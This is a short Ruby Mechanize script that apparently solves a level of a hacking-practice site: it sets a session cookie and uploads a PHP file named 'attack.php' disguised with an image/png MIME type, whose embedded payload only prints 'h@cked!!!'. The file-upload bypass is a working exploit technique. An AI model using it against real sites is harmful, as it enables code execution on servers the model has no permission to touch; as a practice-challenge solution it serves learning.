#!/usr/bin/ruby
require 'mechanize'
mech=Mechanize.new
uri=URI.parse('http://www.hackerschool.jp/hack/take39.php')
str='PHPSESSID='
Mechanize::Cookie.parse(uri, str){|c|mech.cookie_jar.add(uri, c)}
mech.get(uri)
form=mech.page.forms[4]
form.file_upload_with(:name=>'input_file'){|up|
	up.file_data=File.open(File.dirname(__FILE__)+'/tyama_8946take39.dat'){|f|f.read}
	up.file_name='attack.php'
	up.mime_type='image/png'
}
form.submit
puts mech.page.body
__END__
<?php

  echo 'h@cked!!!';

?>